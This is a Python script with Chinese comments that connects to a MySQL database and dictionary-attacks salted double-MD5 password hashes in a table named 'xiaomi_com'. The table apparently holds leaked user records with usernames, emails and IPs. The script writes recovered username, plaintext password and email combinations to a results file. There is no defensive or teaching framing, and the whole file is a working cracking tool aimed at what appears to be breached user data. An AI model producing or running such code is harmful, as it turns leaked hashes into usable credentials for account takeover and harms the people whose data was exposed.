import hashlib
import mysql.connector
from mysql.connector import Error

# 函数：根据给定的密码和盐值计算哈希
def calculate_hash(password, salt):
    return hashlib.md5(hashlib.md5(password.encode()).hexdigest().encode() + salt.encode()).hexdigest()

# 函数：连接到数据库并破解密码
def crack_database_passwords(host, database, user, password, table):
    conn = None
    try:
        conn = mysql.connector.connect(
            host=host,
            database=database,
            user=user,
            password=password
        )

        if conn.is_connected():
            print('Connected to MySQL database')

            cursor = conn.cursor()

            # 计算总行数以显示进度
            cursor.execute(f"SELECT COUNT(*) FROM {table}")
            total_rows = cursor.fetchone()[0]
            print(f"Total rows in table: {total_rows}")

            # 读取弱口令列表
            with open('processed_pass.txt', 'r') as file:
                common_passwords = [line.strip() for line in file.readlines()]

            offset = 0
            limit = 1000

            while offset < total_rows:
                # 读取数据库的下一批数据
                cursor.execute(f"SELECT id, username, password, email, ip FROM {table}  LIMIT {offset}, {limit}")
                rows = cursor.fetchall()

                # 用于存储破解成功的结果
                cracked_credentials = []

                for row in rows:
                    user_id, username, hashed_password, email, ip = row
                    pass_hash, salt = hashed_password.split(':')

                    for password in common_passwords:
                        # 尝试破解密码
                        if calculate_hash(password, salt) == pass_hash:
                            cracked_credentials.append(f"{username},{password},{email}")


                if cracked_credentials:
                    print(f"Writing {len(cracked_credentials)} cracked credentials to file.")
                    # 将破解成功的结果写入文件
                    with open('cracked_results.txt', 'a', encoding='utf-8') as file:
                        for credential in cracked_credentials:
                            file.write(credential + '\n')
                        file.flush()  # 确保刷新到文件
                    cracked_credentials.clear()  # 清空已写入的破解结果
                else:
                    print("No passwords cracked in this batch.")

                # 更新进度
                offset += limit
                print(f"Processed {offset} of {total_rows} rows")

            print("Password cracking completed.")

    except Error as e:
        print(f"Error: {e}")

    finally:
        if conn and conn.is_connected():
            conn.close()

# 配置数据库信息
host = 'localhost'
database = 'test'
user = 'root'
password = '123456'
table = 'xiaomi_com'

# 调用函数开始破解过程
crack_database_passwords(host, database, user, password, table)
